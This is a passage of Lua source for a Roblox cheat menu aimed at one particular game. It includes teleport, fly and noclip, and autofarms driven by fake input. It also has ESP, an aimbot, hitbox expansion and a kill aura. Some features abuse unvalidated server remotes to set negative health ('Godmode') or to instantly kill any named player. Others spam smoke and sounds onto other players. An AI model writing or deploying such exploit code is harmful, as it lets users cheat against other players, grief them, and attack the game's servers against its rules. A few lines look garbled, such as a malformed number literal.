                thing.Position = UDim2.new(0.2-54892468, 0, 0.932652116, 0)
                mousemoveabs(thing.AbsolutePosition.X, thing.AbsolutePosition.Y)
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, false, game, 0)
    
                thing.Size = UDim2.new(0, 0, 0, 0)
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit.Position = thing.Position
                thing:Destroy()
    
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
                thing.Size = UDim2.new(10, 0, -10, 0)
                thing.Position = UDim2.new(0.254892468, 0, 0.932652116, 0)
                local ypos = thing.AbsolutePosition.Y
                local xpos = thing.AbsolutePosition.X
                mousemoveabs(xpos, ypos)
                vim:SendMouseButtonEvent(xpos, ypos, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(xpos, ypos, 0, false, game, 0)
                return
            elseif selecteditem == 'Spraypaint' or selecteditem == 'C4' or selecteditem == 'Flashlight' or selecteditem == 'Lockpick' or selecteditem == 'Money Flex' or selecteditem == 'Dufflebag' then
                fireclickdetector(game.Workspace.IllegalDealer.ClickDetector)
                game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
                game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false
    
                local vim = game:GetService("VirtualInputManager")
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame:FindFirstChild(selecteditem)
                thing.Size = UDim2.new(10, 0, -10, 0)
                thing.Position = UDim2.new(0.254892468, 0, 0.932652116, 0)
    
                mousemoveabs(thing.AbsolutePosition.X, thing.AbsolutePosition.Y)
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, false, game, 0)
                print("asd")
                thing.Size = UDim2.new(0, 0, 0, 0)
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit.Position = thing.Position
                thing:Destroy()
    
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
                thing.Size = UDim2.new(10, 0, -10, 0)
                local ypos = thing.AbsolutePosition.Y
                local xpos = thing.AbsolutePosition.X
                mousemoveabs(xpos, ypos)
                vim:SendMouseButtonEvent(xpos, ypos, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(xpos, ypos, 0, false, game, 0)
                return
            else
                for i,v in pairs(game.Workspace.GunShop.Slots:GetDescendants()) do
                    if selecteditem ~= nil then
                        if v.Name == selecteditem then
                            wasinshop = true
                            purchaseditem = v
                        end
                    end
                end
    
                if wasinshop then
                    local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = purchaseditem.Parent.MainPart.CFrame + Vector3.new(0, 2, 0)
                    wait(0.2)
                    purchaseditem.Parent.MainPart.ProximityPrompt.MaxActivationDistance = 10
                    purchaseditem.Parent.MainPart.ProximityPrompt.RequiresLineOfSight = false
                    repeat 
                        game.Workspace.Camera.CameraType = Enum.CameraType.Scriptable 
                        task.wait(.5) 
                    until game.Workspace.Camera.CameraType == Enum.CameraType.Scriptable
                    
                
                    local function LookAtObject(target)
                       
                        local lookAtPosition = target.Position
                        
                 
                        local camera = game.Workspace.CurrentCamera
                        
                    
                        local newCameraCFrame = CFrame.new(
                            lookAtPosition + Vector3.new(0, 5, -1),  
                            lookAtPosition  
                        )
                        
                        
                        camera.CFrame = newCameraCFrame
                    end
                    
                   
                    LookAtObject(purchaseditem.Parent.MainPart)
                    wait(2)
    
                    
                    fireproximityprompt(purchaseditem.Parent.MainPart.ProximityPrompt, purchaseditem.Parent.MainPart.ProximityPrompt.HoldDuration + 0.2)
                    wait(purchaseditem.Parent.MainPart.ProximityPrompt.HoldDuration + 0.2)
                    repeat 
                        game.Workspace.Camera.CameraType = Enum.CameraType.Custom 
                        task.wait(.5) 
                    until game.Workspace.Camera.CameraType == Enum.CameraType.Custom
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                    purchaseditem.Parent.MainPart.ProximityPrompt.RequiresLineOfSight = true
                end
            end
        end
    end)
    

    local playerssector = section5.new_sector('Players', 'Right')
    local amount = 5000
    local method = "public"
    local ammo = 5000
    local namechange = ""





        local playerteleport = nil
        local playertextbox = playerssector.element('TextBox', 'Player Name', nil, function(v)
            local inputName = v.Text:lower() 
            local found = false
            
           
            for i, player in pairs(game.Players:GetPlayers()) do
                
                if string.sub(player.Name:lower(), 1, string.len(inputName)) == inputName then
                    playerteleport = player.Name
                    found = true
                    break
                end
            end
            
            if not found then
                Notif:Notify('No player found starting with "' .. v.Text .. '".', 4, "error")
            end
        end)
        
        

    local tpbutton = playerssector.element('Button', 'Teleport', false, function(v)
        if playerteleport ~= nil then
        local player = game.Players:FindFirstChild(playerteleport)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
        end
    end)







    local teleportlocation


    local function createDropdownAndTeleport()
        local options = {}
    
       
        for _, mapLocation in pairs(game.Workspace.MapsLocations:GetChildren()) do
            if mapLocation:FindFirstChild("BillboardGui") and mapLocation.BillboardGui:FindFirstChild("Main") and mapLocation.BillboardGui.Main:FindFirstChild("Emoji") then
                local emojiText = mapLocation.BillboardGui.Main.Emoji.Text
                table.insert(options, emojiText)
            end
        end
    
       
        local tpdropdown = teleports.element('Dropdown', 'Location', {
            options = options
        }, function(v)
            for _, mapLocation in pairs(game.Workspace.MapsLocations:GetChildren()) do
                if mapLocation:FindFirstChild("BillboardGui") and mapLocation.BillboardGui:FindFirstChild("Main") and mapLocation.BillboardGui.Main:FindFirstChild("Emoji") then
                    local emojiText = mapLocation.BillboardGui.Main.Emoji.Text
                    if emojiText == v.Dropdown then
                        teleportlocation = mapLocation
                        break 
                    end
                end
            end
        end)
    end
    

    createDropdownAndTeleport()
    

    local tpbutton = teleports.element('Button', 'Teleport', false, function(v)
        if teleportlocation ~= nil then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = teleportlocation.CFrame
        else
            local LoadingXSX = Notif:Notify("You need to choose a location!", 2, "information")
        end
    end)


    local walkspeedslider = selfsector.element('Slider', 'WalkSpeed', {default = {min = 1, max = 80, default = 5}}, function(v)
        _G.desiredwalkspeed = v.Slider
        game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
            if game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= _G.desiredwalkspeed then
                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.desiredwalkspeed 
            end
        end)
    
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.desiredwalkspeed
     end)

     local jumppowerslider = selfsector.element('Slider', 'JumpPower', {default = {min = 1, max = 500, default = 40}}, function(v)
        _G.desiredjumppower = v.Slider
        game.Players.LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("JumpPower"):Connect(function()
            if game.Players.LocalPlayer.Character.Humanoid.JumpPower ~= _G.desiredjumppower then
                game.Players.LocalPlayer.Character.Humanoid.JumpPower = _G.desiredjumppower 
            end
        end)
    
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = _G.desiredjumppower
     end)


    local flytoggle = selfsector.element('Toggle', 'Flying', false, function(v)
        _G.flying = v.Toggle
        if v.Toggle then
            local LoadingXSX = Notif:Notify("Fly Started", 2, "information")  
        else
            local LoadingXSX = Notif:Notify("Fly Stopped", 2, "information") 
        end
    end)

    
    local flytoggle = autofarmsector.element('Toggle', 'Mop Autofarm', false, function(v)
        _G.automopfarm = v.Toggle
while _G.automopfarm do
for i,v in pairs(game.Workspace.CleanPart:GetChildren()) do
    if v.ProximityPrompt.Enabled == true then
    game:GetService("ReplicatedStorage").GiveMop:FireServer()
    v.ProximityPrompt.HoldDuration = 1
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame + Vector3.new(0, 2, 0)
    wait(0.1)
    fireproximityprompt(v.ProximityPrompt, v.ProximityPrompt.HoldDuration, false)
        wait(v.ProximityPrompt.HoldDuration + 0.2 + 2)
    end
    end
end
end)


local flytoggle = autofarmsector.element('Toggle', 'Box Autofarm', false, function(v)
    _G.autoboxfarm = v.Toggle
    
   
    task.spawn(function()
        print("Boxing coroutine started")
        while _G.autoboxfarm do
            local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Job.Box.BOX1.CFrame
            wait(0.5)
            fireclickdetector(game.Workspace.Job.Box.BOX1.ClickDetector)
            wait(0.2)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
            game.Players.LocalPlayer.Backpack:WaitForChild("Box").Parent = game.Players.LocalPlayer.Character
            firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 0)
            wait()
            firetouchinterest(game.Workspace.Job.Box.Job, game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, 1)
            wait(15)
            print("Boxing task done")
            wait(0.1) 
        end
        print("Boxing coroutine stopped")
    end)
end)




        
        while _G.noclip do
            game:GetService("RunService").RenderStepped:wait()
                    local character = game.Players.LocalPlayer.Character
                    if character then
                        for _, part in pairs(character:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.CanCollide = false
                            end
                        end
                    end
                end
    end)

    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local mouse = player:GetMouse()


-- Dupe removed By Dkshub
  
    _G.OnePunch = false 
    
    local function activateTool()
        local character = player.Character or player.CharacterAdded:Wait()
        local tool = character:FindFirstChild("Fist")
        
        if tool and _G.OnePunch then
          
            for _, target in ipairs(Players:GetPlayers()) do
                if target ~= player and target.Character and target.Character:FindFirstChild("UpperTorso") then
                    local distance = (target.Character.UpperTorso.Position - character.RightHand.Position).Magnitude
                    
                    if distance <= 3 then
                       
                        tool.Script.legma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, character.RightHand)
                        tool.Script.egma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, character.RightHand)
                        return
                    end
                end
            end
        end
    end
    

    mouse.Button1Down:Connect(function()
        activateTool()
    end)
    
local nocliptoggle = selfsector.element('Toggle', 'One Punch', false, function(v)
    _G.OnePunch = v.Toggle
end)



    local disablejump = selfsector.element('Button', 'Disable Jump Cooldown', false, function(v)
        game:GetService("Players").LocalPlayer.PlayerGui.JumpCooldown.Enabled = false
    end)

    local disablejump = selfsector.element('Button', 'Disable Camera Shake', false, function(v)
        game:GetService("Players").LocalPlayer.Character.CharacterScripts.Enabled = false
    end)

    local disablejump = selfsector.element('Button', 'Remove Limbs', false, function(v)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local humanoid = character:FindFirstChild("Humanoid")

if humanoid then
    game:GetService("ReplicatedStorage").Ragdoll:FireServer(true)
game.Players.LocalPlayer.Character.Humanoid.Jump = true
    humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll)
    game.Players.LocalPlayer.Character.Humanoid.RequiresNeck = false 
end

        local originalPosition = humanoidRootPart.Position
        

        humanoidRootPart.CFrame = CFrame.new(originalPosition.X, originalPosition.Y + 5000, originalPosition.Z)
        

        local ragdollFolder = character:FindFirstChild("RagdollConstraints")
        
        if ragdollFolder then

            for _, constraint in ipairs(ragdollFolder:GetChildren()) do
                if constraint:IsA("HingeConstraint") or constraint:IsA("BallSocketConstraint") then
  
                    constraint.Enabled = false
                end
            end
        end
        

        wait(2) 
        

        humanoidRootPart.CFrame = CFrame.new(originalPosition)
        player.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
    end)

    local tpbutton = selfsector.element('Button', 'Godmode', false, function(v)
        -- sw2 godmode
game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(game.Players.LocalPlayer.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(game.Players.LocalPlayer.Character.UpperTorso, -math.huge, game.Players.LocalPlayer.Character.RightHand)
wait(0.5)
Notif:Notify("New Health: " .. tostring(game.Players.LocalPlayer.Character.Humanoid.Health), 4, "information")
    end)





    


    local ammoslider = sector3.element('Slider', 'Ammo', {default = {min = 1, max = 10000, default = 5000}}, function(v)
       ammo = v.Slider
        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if tool then
        if tool:FindFirstChild("Stuff") then
            tool.Stuff.Values.CurrentAmmo.MaxValue = 100000000000000
        tool.Stuff.Values.StoredAmmo.MaxValue = 100000000000000
    
            tool.Stuff.Values.CurrentAmmo.MinValue = 0
        tool.Stuff.Values.StoredAmmo.MinValue = 0
    
        tool.Stuff.Values.CurrentAmmo.Value = ammo
        tool.Stuff.Values.StoredAmmo.Value = ammo
        end
        end
    end)

    local tracertoggle = sector3.element('Toggle', 'Tracers', false, function(v)
        _G.tracers = v.Toggle
    end)


    
    
    local toggle = sector3.element('Button', 'Unlock Firerate', false, function(v)

        local referencemodule = game.ReplicatedStorage.Assets.Tools["Custom GD"]

        if not referencemodule then
            warn("reference module not found")
            return
        end
        
        for _, v in pairs(game.ReplicatedStorage.Assets.Tools:GetChildren()) do
            local newv = referencemodule:Clone()
            newv.Parent = game.ReplicatedStorage.Assets.Tools
            newv.Name = v.Name
            local existingSounds = newv:FindFirstChild("Sounds")
            if existingSounds then
                existingSounds:Destroy()
            end
            local oldSounds = v:FindFirstChild("Sounds")
            if oldSounds then
                oldSounds.Parent = newv
            end
            v:Destroy()
        end

        _G.FixingName = true
        while _G.FixingName do
            wait()
            if game.Players.LocalPlayer.Character then
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
        game.Players.LocalPlayer.PlayerGui.GunUI.GunStats.Weapon.Text = "Modded " .. game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
        end
        end
        end
    end)
    

    local tracertoggle = soundssection.element('Toggle', 'FE Drill Music', false, function(v)
        if v.Toggle then
            local findfirstchild = workspace.SpawnedVehicles[game.Players.LocalPlayer.Name .. "'s Car"]
            findfirstchild.AC6_Sound:FireServer("playSound", workspace.MusicZones:GetChildren()[6].Music)
        else
            local findfirstchild = workspace.SpawnedVehicles[game.Players.LocalPlayer.Name .. "'s Car"]
            findfirstchild.AC6_Sound:FireServer("stopSound", workspace.MusicZones:GetChildren()[6].Music)
        end
    end)

    local tracertoggle = soundssection.element('Toggle', 'FE Calling', false, function(v)
        if v.Toggle then
            local findfirstchild = workspace.SpawnedVehicles[game.Players.LocalPlayer.Name .. "'s Car"]
            findfirstchild.AC6_Sound:FireServer("playSound", game:GetService("SoundService").PhoneRing)
        else
            local findfirstchild = workspace.SpawnedVehicles[game.Players.LocalPlayer.Name .. "'s Car"]
            findfirstchild.AC6_Sound:FireServer("stopSound", game:GetService("SoundService").PhoneRing)
        end
    end)

    local toggle = soundssection.element('Button', 'FE Bass Boost', false, function(v)
        local findfirstchild = workspace.SpawnedVehicles[game.Players.LocalPlayer.Name .. "'s Car"]
        findfirstchild.AC6_Sound:FireServer("playSound", game:GetService("ReplicatedStorage").Assets.Tools["Nerf GLOCKK"].Sounds.Fire.Sound)
        
    end)

    local tracertoggle = sector3.element('Toggle', 'Car Smoke', false, function(v)
        _G.spam = v.Toggle
        while _G.spam do
            task.wait()
            for _, vehicle in pairs(workspace.SpawnedVehicles:GetChildren()) do
                if vehicle:FindFirstChild("Smoke_FE") then
                    vehicle.Smoke_FE:FireServer(
                        "UpdateSmoke", 
                        100000000, 
                        100000000
                    )
            
                end
            end
        end
    end)
    



        local ammoslider = section4.element('Slider', 'HBE', {default = {min = 2, max = 30, default = 2}}, function(v)
            local size = v.Slider

            for i,v in pairs(game.Players:GetChildren()) do
                if v.Character and v ~= game.Players.LocalPlayer then
                    if v.Character:FindFirstChild("HumanoidRootPart") then
                        v.Character.HumanoidRootPart.Size = Vector3.new(size, size, size)
                        v.Character.HumanoidRootPart.Transparency = 0.8
                        v.Character.HumanoidRootPart.Color = Color3.new(0.3921568627,0.3921568627,1)
                       v.Character.HumanoidRootPart.CanCollide = false
                    end
                end
            end
         end)

         local esptoggle = section4.element('Toggle', 'ESP', false, function(v)
            _G.EspEnabled = v.Toggle
local function calculateBoundingBox(character)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    local humanoid = character:FindFirstChild("Humanoid")

    if rootPart and humanoid then
 
        local height = humanoid.HipHeight * 2 + 2 
        local width = 2
        local depth = 1 
        return Vector3.new(width, height, depth)
    end

    return nil
end



local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local camera = game:GetService("Workspace").CurrentCamera


local drawings = {}

local function createESP(player)
    if not drawings[player.Name] then
        local box = Drawing.new("Square")
        box.Visible = false
        box.Color = Color3.new(0.3921568627, 0.3921568627, 1)
        box.Thickness = 2
        box.Filled = false

        local healthBar = Drawing.new("Square")
        healthBar.Visible = false
        healthBar.Filled = true

        local nameTag = Drawing.new("Text")
        nameTag.Visible = false
        nameTag.Center = true
        nameTag.Outline = true
        nameTag.Size = 15
        nameTag.Color = Color3.new(1, 1, 1)
        nameTag.Font = 1

        drawings[player.Name] = {box = box, healthBar = healthBar, nameTag = nameTag}
    end
end

local function removeESP(player)
    if drawings[player.Name] then
        drawings[player.Name].box:Remove()
        drawings[player.Name].healthBar:Remove()
        drawings[player.Name].nameTag:Remove()
        drawings[player.Name] = nil
    end
end

local function lerpColor(fromColor, toColor, t)
    return Color3.new(
        fromColor.R + (toColor.R - fromColor.R) * t,
        fromColor.G + (toColor.G - fromColor.G) * t,
        fromColor.B + (toColor.B - fromColor.B) * t
    )
end


local function getRainbowColor()
    local t = tick() * 0.5 
    return Color3.fromHSV(t % 1, 1, 1)
end


local function onCharacterAdded(player)
    removeESP(player)
    createESP(player)
end

for _, player in pairs(Players:GetPlayers()) do
    player.CharacterAdded:Connect(function()
        onCharacterAdded(player)
    end)
end


game.Players.LocalPlayer.Character.Humanoid.Died:Connect(function()
    if _G.EspEnabled then
    _G.EspEnabled = false
    wait(20)
    _G.EspEnabled = true
end
end)

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        onCharacterAdded(player)
    end)
end)

Players.PlayerRemoving:Connect(function(player)
    removeESP(player)
end)

while _G.EspEnabled do
    task.wait(0.01)
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local character = player.Character
            if character then
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    createESP(player)

                   
                    local rootPosition, onScreen = camera:WorldToViewportPoint(rootPart.Position)

                    if onScreen then
                        local humanoid = character:FindFirstChild("Humanoid")
                        if humanoid then
                           
                            local boundingBox = calculateBoundingBox(character)
                            if boundingBox then
                                local distance = (localPlayer.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude

                                
                                local headPosition, _ = camera:WorldToViewportPoint(rootPart.Position + Vector3.new(0, boundingBox.Y / 2, 0))
                                local footPosition, _ = camera:WorldToViewportPoint(rootPart.Position - Vector3.new(0, boundingBox.Y / 2, 0))

                                local heightOnScreen = math.abs(headPosition.Y - footPosition.Y)
                                local widthOnScreen = heightOnScreen / 2 

                                local box = drawings[player.Name].box
                                
                              
                                box.Size = Vector2.new(widthOnScreen, heightOnScreen)
                                box.Position = Vector2.new(rootPosition.X - box.Size.X / 2, rootPosition.Y - box.Size.Y / 2)
                                box.Visible = true

                             
                                local healthBar = drawings[player.Name].healthBar
                                local healthRatio = humanoid.Health / humanoid.MaxHealth
                                local maxHealth = humanoid.MaxHealth

                          
                                if maxHealth > 100 or humanoid.Health > 100 then
                                    healthBar.Size = Vector2.new(5, heightOnScreen)
                                    healthBar.Color = getRainbowColor() 
                                    healthBar.Position = Vector2.new(box.Position.X - 10, box.Position.Y + heightOnScreen * 0)  
                                else
                                    healthBar.Size = Vector2.new(5, heightOnScreen * healthRatio)
                                    healthBar.Color = lerpColor(Color3.new(1, 0, 0), Color3.new(0, 1, 0), healthRatio) 
                                    healthBar.Position = Vector2.new(box.Position.X - 10, box.Position.Y + heightOnScreen * (1 - healthRatio))
                                end
                                healthBar.Visible = true

                       
                                nameTag = drawings[player.Name].nameTag
                                if nameTag then
                                   
                                    local scale = math.clamp(500 / distance, 5, 10)
                                    nameTag.Size = scale

                                    nameTag.Text = player.Name .. "\nHealth: " .. math.floor(humanoid.Health) .. "\nDist: " .. math.floor(distance)
                                    nameTag.Position = Vector2.new(rootPosition.X, rootPosition.Y - heightOnScreen - 20) 
                                    nameTag.Visible = true
                                end

                            end
                        end
                    else
                       
                        if drawings[player.Name] then
                            drawings[player.Name].box.Visible = false
                            drawings[player.Name].healthBar.Visible = false
                            drawings[player.Name].nameTag.Visible = false
                        end
                    end
                end
            end
        end
    end
end



if not _G.EspEnabled then
    for _, drawing in pairs(drawings) do
        drawing.box:Remove()
        drawing.healthBar:Remove()
        drawing.nameTag:Remove()
    end
    drawings = {}
end

        end)

        local esptoggle = section4.element('Toggle', 'Aimbot', false, function(v)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local localPlayer = Players.LocalPlayer
local mouse = localPlayer:GetMouse()
local camera = workspace.CurrentCamera


_G.aimbotSystemEnabled = v.Toggle


local aimCircleRadius = 100
local aimbotEnabled = false
local circleColor = Color3.new(0.3921568627, 0.3921568627, 1)


local aimCircle = nil


local function createAimCircle()
    aimCircle = Drawing.new("Circle")
    aimCircle.Visible = false
    aimCircle.Color = circleColor
    aimCircle.Thickness = 2
    aimCircle.Radius = aimCircleRadius
    aimCircle.Filled = false
end


local function destroyAimCircle()
    if aimCircle then
        aimCircle:Remove() 
        aimCircle = nil
    end
end


local function isPlayerInAimCircle(player)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local rootPart = character.HumanoidRootPart
        local screenPos, onScreen = workspace.CurrentCamera:WorldToScreenPoint(rootPart.Position)
        if onScreen then
            local mousePos = Vector2.new(mouse.X, mouse.Y)
            local distFromMouse = (mousePos - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
            return distFromMouse <= aimCircleRadius, distFromMouse
        end
    end
    return false, math.huge
end

local function getClosestPlayer()
    local closestPlayer = nil
    local closestDistance = aimCircleRadius

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            local character = player.Character
  
            if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
                local inCircle, distance = isPlayerInAimCircle(player)
                if inCircle and distance < closestDistance then
                    closestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end

    return closestPlayer
end


local function aimAtTarget(player)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Head") then
        local rootPart = character.UpperTorso
        local head = character.Head

        local cameraOffset = (camera.CFrame.Position - rootPart.Position).Magnitude
        local isFirstPerson = cameraOffset < 1 

        if isFirstPerson then
           
            local adjustedHeadPosition = rootPart.Position
            camera.CFrame = CFrame.new(camera.CFrame.Position, adjustedHeadPosition)
        else
            
            local adjustedHeadPosition = rootPart.Position
            camera.CFrame = CFrame.new(camera.CFrame.Position, adjustedHeadPosition)
        end
    end
end




UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 and _G.aimbotSystemEnabled then
        aimbotEnabled = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        aimbotEnabled = false
    end
end)


RunService.RenderStepped:Connect(function()

    if not _G.aimbotSystemEnabled then
        destroyAimCircle()
        return
    end


    if not aimCircle then
        createAimCircle()
    end


    aimCircle.Position = Vector2.new(mouse.X, mouse.Y + 40)
    aimCircle.Visible = true


    if aimbotEnabled then
        local closestPlayer = getClosestPlayer()
        if closestPlayer then
            aimAtTarget(closestPlayer)
        end
    end
end)


_G.toggleAimbotSystem = function()
    _G.aimbotSystemEnabled = not _G.aimbotSystemEnabled
    if not _G.aimbotSystemEnabled then
       
        destroyAimCircle()
    else
        
        createAimCircle()
    end
end

        end)

        local esptoggle = section4.element('Toggle', 'Wallbang', false, function(v)
            _G.wallbang = v.Toggle
                    end)
            


local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local torso = character:WaitForChild("HumanoidRootPart")
local runService = game:GetService("RunService")
local distancekillaura = 6 


local bricks = {}
local bricksCreated = false 


local function generateRandomName(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local name = ""
    for i = 1, length do
        local rand = math.random(1, #chars)
        name = name .. chars:sub(rand, rand)
    end
    return name
end


local function createBricks()
    if not bricksCreated then
        for i = 1, 30 do
            local brick = Instance.new("Part")
            brick.Size = Vector3.new(1, 1, 1)
            brick.Material = Enum.Material.ForceField
            brick.Color = Color3.new(0.3921568627, 0.3921568627, 1) 
            brick.Anchored = false
            brick.CanCollide = false
            brick.Name = "killaura_" .. generateRandomName(8) 
            brick.Parent = workspace
            brick.Transparency = 1
            
            local angle = math.rad((i / 30) * 360) 
            local xOffset = math.cos(angle) * distancekillaura
            local zOffset = math.sin(angle) * distancekillaura

            brick.Position = torso.Position + Vector3.new(xOffset, 2, zOffset)

           
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
            bodyVelocity.Velocity = Vector3.new(0, 10, 0)
            bodyVelocity.Parent = brick

            
            table.insert(bricks, brick)
        end
        bricksCreated = true
    end
end


local function setBricksVisibility(visible, color)
    for _, brick in ipairs(bricks) do
        if brick then
            brick.Transparency = visible and 0 or 1
            brick.CanCollide = visible
            brick.Color = color
        end
    end
end


local function updateBricksPosition()
    local rotationSpeed = 2 
    for i, brick in ipairs(bricks) do
        local angle = (i / 30) * 2 * math.pi + (rotationSpeed * tick() % (2 * math.pi))
        local xOffset = math.cos(angle) * distancekillaura
        local zOffset = math.sin(angle) * distancekillaura
        local yOffset = 2 
        
        brick.Position = torso.Position + Vector3.new(xOffset, yOffset, zOffset)
    end
end

createBricks()

local function killaura()
    local players = game.Players:GetPlayers()
    for _, otherPlayer in ipairs(players) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPosition = otherPlayer.Character.HumanoidRootPart.Position
            local playerPosition = torso.Position
            local distanceToPlayer = (targetPosition - playerPosition).magnitude
            
            if distanceToPlayer <= distancekillaura then
                
                local fist = player.Backpack:FindFirstChild("Fist")
                if fist and fist:FindFirstChild("Script") then
                    fist.Script.egma:FireServer(otherPlayer.Character.UpperTorso, 100, player.Character.RightHand)
                    fist.Script.legma:FireServer(otherPlayer.Character.UpperTorso, 100, player.Character.RightHand)
                end
            end
        end
    end
end

local function healaura()
    local players = game.Players:GetPlayers()
    for _, otherPlayer in ipairs(players) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local targetPosition = otherPlayer.Character.HumanoidRootPart.Position
            local playerPosition = torso.Position
            local distanceToPlayer = (targetPosition - playerPosition).magnitude
            
            if distanceToPlayer <= distancekillaura then
               
                local fist = player.Backpack:FindFirstChild("Fist")
                if fist and fist:FindFirstChild("Script") then
                    fist.Script.egma:FireServer(otherPlayer.Character.UpperTorso, -10, player.Character.RightHand)
                    fist.Script.legma:FireServer(otherPlayer.Character.UpperTorso, -10, player.Character.RightHand)
                end
            end
        end
    end
end
if premium then
local esptoggle = section4.element('Toggle', 'Kill Aura', false, function(v)
    _G.killauracircle = v.Toggle 

    if _G.killauracircle then
      
        setBricksVisibility(true, Color3.new(1, 0, 0))
        spawn(function()
            while _G.killauracircle do
                task.wait()
                updateBricksPosition()
                killaura()
            end
        end)
    else
        
        _G.killauracircle = false
        setBricksVisibility(false, Color3.new(1, 0, 0))
    end
end)

local esptoggle = section4.element('Toggle', 'Heal Aura', false, function(v)
    _G.healauracircle = v.Toggle 

    if _G.healauracircle then
        setBricksVisibility(true, Color3.new(0.3921568627, 0.3921568627, 1))
        spawn(function()
            while _G.healauracircle do
                task.wait()
                updateBricksPosition()
                healaura()
            end
        end)
    else
        _G.killauracircle = false
        setBricksVisibility(false, Color3.new(0.3921568627, 0.3921568627, 1))
    end
end)
end    

       local crashtarget = nil
       local playertextbox = section4.element('TextBox', 'Player Name', nil, function(v)
        local inputName2 = v.Text:lower() 
        local found2 = false
        
        for i, player in pairs(game.Players:GetPlayers()) do
            
            if string.sub(player.Name:lower(), 1, string.len(inputName2)) == inputName2 then
                crashtarget = player.Name
                found2 = true
                break
            end
        end
        
        if not found2 then
            Notif:Notify('No player found starting with "' .. v.Text .. '".', 4, "error")
        end
    end)
    

     local toggle = section4.element('Button', 'Kill Player', false, function(v)
        local target = game.Players[crashtarget]
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.egma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
        game.Players.LocalPlayer.Backpack:WaitForChild("Fist").Script.legma:FireServer(target.Character.UpperTorso, target.Character.Humanoid.Health, game.Players.LocalPlayer.Character.RightHand)
            wait(2)
            Notif:Notify("Targets Health: " .. tostring(target.Character.Humanoid.Health), 4, "information")
    end)

